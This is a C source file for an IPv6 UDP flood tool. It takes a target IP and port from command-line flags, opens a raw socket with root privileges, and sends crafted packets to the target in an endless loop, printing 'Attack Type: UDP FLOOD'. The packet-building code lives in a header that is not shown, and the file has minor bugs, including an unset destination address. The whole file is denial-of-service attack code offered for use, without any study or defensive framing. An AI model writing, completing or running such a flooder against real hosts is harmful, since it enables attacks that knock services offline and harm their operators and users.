#include <netinet/ip.h>
#include <stdio.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include "packets_settings.h"
#define DEFAULT_IP "::1"
#define DEFAULT_PORT 443

// typedef struct Target {
//     char* _ip;
//     int _port;
//     char* _type;
// } Target;

void get_cli(int argc, char* argv[], struct packet* pkt) {
    switch (argc) {
        default:
            printf("Error, too many values or incorrect entry\n");
            exit(1);
            break;
        case 1:
            printf("There is no input.\nDefault values will be entered\n\n");
            strcpy(pkt->target_ip_address, DEFAULT_IP);
            pkt->target_port = 443;
            pkt->protocol = IPPROTO_UDP;
            break;
        case 5:
            if ((strcmp(argv[1], "-t") == 0) && (strcmp(argv[3], "-p") == 0)) {
                strcpy(pkt->target_ip_address, argv[2]);
                pkt->target_port = atoi((char*)argv[4]);
                pkt->protocol = IPPROTO_UDP;
                break;
            } else {
                printf("Error, too many values or incorrect entry\n");
                exit(1);
                break;
            }
    }
}
void run(struct packet* pkt) {
}
/*
The following main function can have the following parameters (flags)
-t	The target IP address for the flood attacks, default is ::1
-p	The target port, default is 443
*/

int main(int argc, char* argv[]) {
    srand(time(NULL));  //Get different random result

    // //Get user choices
    // get_cli(argc, argv, &target);

    struct packet pkt;
    memset(&pkt, 0, sizeof(struct packet));

    //Get user choices
    get_cli(argc, argv, &pkt);

    int enable = 1;
    // MUST use sudo, otherwise we'll encounter an error here
    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
    int sockopt = setsockopt(sock, IPPROTO_IPV6, IPV6_HDRINCL, &enable, sizeof(enable));
    if (sockopt == -1 || sock == -1) exit(1);

    struct sockaddr_in6 dst;
    dst.sin6_family = AF_INET6;
    dst.sin6_port = htons(pkt.source_port);

    char packet[48];

    printf("Attack Type: UDP FLOOD\nTarget: %s:%d\n", pkt.target_ip_address, pkt.target_port);
    // infinite loop, up to user exit
    while (1) {
        memset(packet, 0, 48);
        create_packet(packet, &pkt);
        // printf("%s\n", pkt.source_ip_address);

        sendto(sock, packet, (IPHDR_SZ + sizeof(struct udphdr)), 0, (struct sockaddr*)&dst, sizeof(dst));
    }

    close(sock);
    return 0;
}
